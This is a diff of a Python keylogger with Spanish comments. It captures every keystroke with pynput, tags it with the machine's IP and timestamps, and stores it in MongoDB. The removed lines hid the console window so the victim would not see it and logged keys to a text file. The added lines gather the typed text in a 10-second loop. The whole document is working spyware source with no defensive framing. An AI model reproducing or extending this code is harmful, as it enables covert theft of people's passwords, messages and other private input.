@@ -1,32 +1,33 @@
-#Para esconder la ventana
-import win32console
-import win32gui
+import threading
+from mongobd import conexion
 import pynput.keyboard
 import socket
+import time
+import sys
 from datetime import datetime
-from mongobd import conexion
-import threading, time
-import pymongo
-#trabajar con palabras
 
-ventana = win32console.GetConsoleWindow()
-win32gui.ShowWindow(ventana,0)#para acultar la venta
 
-log_file = open('log.txt','w+')
 lista_tecla=[] #En esta lista se guardaran las palabras
+
+def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final):
+    mongo_conexion = conexion()
+    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final)
+
 def imprimir():
     tecla = ''.join(lista_tecla)
-    log_file.write(tecla)
-    log_file.write("\n")
-    log_file.close()
+    #2.SEGUNDO PASO
+    return tecla
+
 def presiona(key):
     key1 = convertir(key)
     #Key es con la letra k en mayuscula
     if key1 == "Key.esc":
         print("Saliendo...")
-        imprimir()#imprime en el txt
-        extrar_informacion()
-        return False
+        #imprimir()#imprime en el documento txt
+        #extrar_informacion()
+        #sys.exit()
+        raise
+        #liste.stop()
     #Si es igual al espacio
     elif key1 == "Key.space":
         lista_tecla.append(" ")
@@ -61,24 +62,20 @@ def extrar_informacion():
                 informacion = informacion + linea
             contador = contador+1
 
-    agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final)
-
-def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final):
-    mongo_conexion = conexion()
-    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final)
-
-def obtener_procesos():
+def ciclo_ejecucion():
     while True:
-        lista_tecla.append(datetime.now().strftime('%Y-%m-%d %H:%M:%S' + "\n"))
-        with pynput.keyboard.Listener(on_press=presiona) as liste:
-            liste.join()
+        time.sleep(10)
+        #1.PRIMER PASO
+        ip_equipo = socket.gethostbyname(socket.gethostname())
+        tiempo_inicial = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        lo_escrito = imprimir()
+        tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(ip_equipo+"\n"+tiempo_inicial+"\n"+tiempo_final+"\n"+lo_escrito)
+        lista_tecla.clear()
 
 
 
-
-
-#Hora de ejecucion del programa
-lista_tecla.append(datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n"))
-#Lo que obtenemos al teclear
 with pynput.keyboard.Listener(on_press=presiona) as liste:
     liste.join()
+
+
